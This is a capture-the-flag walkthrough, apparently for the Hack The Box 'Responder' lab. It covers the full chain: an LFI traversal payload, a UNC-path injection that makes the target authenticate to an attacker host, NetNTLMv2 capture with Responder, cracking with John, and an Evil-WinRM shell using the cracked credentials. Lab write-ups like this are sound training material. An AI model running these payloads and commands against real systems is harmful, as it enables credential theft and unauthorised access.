
# Responder Challenge – Full Attack Chain

## 1. What is LFI (Local File Inclusion)?

**Local File Inclusion (LFI)** is a web vulnerability that occurs when a web application dynamically loads files based on user input, without properly validating or sanitizing that input. This can lead to an attacker reading arbitrary files on the server.

Example:
```
http://target.htb/index.php?page=french.html
```
If the input is not sanitized:
```
?page=../../../../windows/system32/drivers/etc/hosts
```
This allows file reading from the server.

## 2. Leveraging LFI to Trigger SMB Authentication

On Windows, accessing a path like:
```
\\10.10.14.5\share
```
causes the system to attempt an SMB connection and send NTLM authentication data.

An attacker can insert this path through LFI:
```
?page=\\10.10.14.5\abc
```

## 3. What is NTLM?

**NTLM (New Technology LAN Manager)** is a Microsoft authentication protocol.

**Steps:**
1. Client sends username and domain.
2. Server sends a challenge.
3. Client encrypts the challenge using the password hash.
4. Client sends the encrypted response.
5. Server validates the response by doing the same encryption.

## 4. NT Hash vs NetNTLMv2

- **NT Hash**: `MD4(UTF-16LE(password))` – stored in SAM or Active Directory.
- **NetNTLMv2**: The formatted challenge-response sent during NTLM authentication over the network.

## 5. Responder: Capturing NTLM Authentication

**Responder** mimics SMB/HTTP/FTP servers to capture NTLM credentials.

Command:
```
sudo responder -I tun0
```

Attacker triggers LFI with SMB path, e.g.:
```
?page=\\attacker-ip\share
```

Responder captures:
- Username
- Domain
- Challenge
- Encrypted Response

## 6. Cracking NetNTLMv2 with John

Save captured hash into `hash.txt`:

Run:
```
john hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

John tries passwords until it finds one that produces the same response.

## 7. Using Evil-WinRM for Remote Shell

With cracked credentials (e.g. `administrator:badminton`):

Command:
```
evil-winrm -i 10.10.10.X -u administrator -p badminton
```

This opens a remote PowerShell session.

## 8. Reading the Flag

Commands:
```
cd C:\Users
dir
cd mike\Desktop
dir
type flag.txt
```

## Summary Table

| Step | Description |
|------|-------------|
| 1 | Find LFI vulnerability |
| 2 | Trigger SMB connection with UNC path |
| 3 | Capture NetNTLMv2 using Responder |
| 4 | Save and prepare hash file |
| 5 | Crack with John |
| 6 | Log in using Evil-WinRM |
| 7 | Read flag from user's Desktop |
